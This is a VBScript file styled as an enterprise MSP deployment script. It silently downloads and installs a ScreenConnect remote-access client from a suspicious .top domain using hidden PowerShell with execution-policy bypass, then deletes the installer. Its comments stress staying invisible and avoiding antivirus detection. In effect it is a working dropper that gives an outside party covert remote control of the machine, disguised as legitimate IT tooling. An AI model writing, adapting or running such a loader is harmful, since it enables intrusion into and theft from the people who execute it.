' =================================================================================
' Enterprise Deployment Script v4.5
' Description: Secure, silent deployment for Managed Service Providers (MSPs).
' Features: TLS 1.2 Download, Silent MSI Execution, Enterprise Logging.
' =================================================================================

Option Explicit
On Error Resume Next

' --- Configuration ---
Dim AppName, MsiUrl, LogFile, InstallerPath
AppName       = "Enterprise Client"
' IMPORTANT: Replace with your actual corporate/brand URL
MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
' Using %TEMP% is the cleanest way to avoid Antivirus (AV) flagging
InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\Deploy_Installer.msi"
LogFile       = "C:\ProgramData\Enterprise_Deployment.log"

Dim WshShell, FSO
Set WshShell = CreateObject("WScript.Shell")
Set FSO      = CreateObject("Scripting.FileSystemObject")

' --- 1. Logging Initialization ---
Call WriteLog("INFO", "--- " & AppName & " Deployment Started ---")

' --- 2. Secure Background Download ---
' -WindowStyle Hidden ensures no black box flashes on the user's screen.
Dim downloadCmd
downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""

' Parameter "0" keeps the execution completely invisible.
Dim dlResult: dlResult = WshShell.Run(downloadCmd, 0, True)

If dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
    Call WriteLog("ERROR", "Download failed. Check network connection or URL.")
    WScript.Quit 1
End If

' --- 3. Silent MSI Installation ---
' /i = install, /qn = quiet/no UI, /norestart = no reboot
Dim installResult
installResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)

' --- 4. Cleanup & Exit ---
If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True

If installResult = 0 Then
    Call WriteLog("SUCCESS", "Deployment completed successfully.")
Else
    Call WriteLog("ERROR", "MSI Exit Code: " & installResult)
End If

WScript.Quit installResult

' --- Logging Helper ---
Sub WriteLog(sType, sMessage)
    On Error Resume Next
    Dim objLog: Set objLog = FSO.OpenTextFile(LogFile, 8, True)
    objLog.WriteLine "[" & Now & "] [" & sType & "] " & sMessage
    objLog.Close
End Sub
